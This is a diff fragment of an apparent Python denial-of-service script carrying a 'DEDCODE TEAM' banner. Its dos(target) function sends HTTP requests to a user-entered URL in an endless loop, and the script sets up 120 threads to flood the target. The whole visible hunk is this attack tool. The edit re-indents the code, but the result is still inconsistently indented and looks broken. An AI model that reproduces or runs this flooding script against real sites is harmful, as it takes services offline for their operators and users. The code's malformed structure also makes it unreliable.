@@ -20,17 +20,15 @@ print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
 
 def dos(target):
 while True:
-
-try:
-res = requests.get(target)
-print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
-except requests.exceptions.ConnectionError:
-print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
-
-  threads = 120
+   try:
+      res = requests.get(target)
+      print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
+   except requests.exceptions.ConnectionError:
+      print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
+threads = 120
 url = input("URL: ")
-try:
-  threads = int(input("Threads: "))
+   try:
+     threads = int(input("Threads: "))
 except ValueError:
   exit("Threads count is incorrect!")
 
